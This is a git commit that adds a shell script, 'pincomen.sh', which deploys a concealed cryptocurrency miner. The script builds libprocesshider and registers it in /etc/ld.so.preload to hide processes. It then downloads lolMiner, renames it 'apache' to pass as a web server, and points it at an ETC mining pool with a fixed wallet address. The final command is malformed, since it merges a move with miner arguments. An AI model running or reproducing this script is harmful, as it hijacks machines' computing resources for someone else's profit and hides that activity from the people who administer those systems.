172f5d049b318cbb767b29b6a98d1a80c8f433cd
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-09-12 11:08:18 +0700

    Create pincomen.sh

---
+++ pincomen.sh
@@ -0,0 +1,18 @@
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/America/Toronto /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+apt update
+apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
+service tor start
+
+git clone https://github.com/hanifgz/libprocesshider.git
+cd libprocesshider;make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+cd ..
+
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz
+tar -xf lolMiner_v1.51_Lin64.tar.gz
+cd 1.51
+mv lolMiner ../apache --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
+
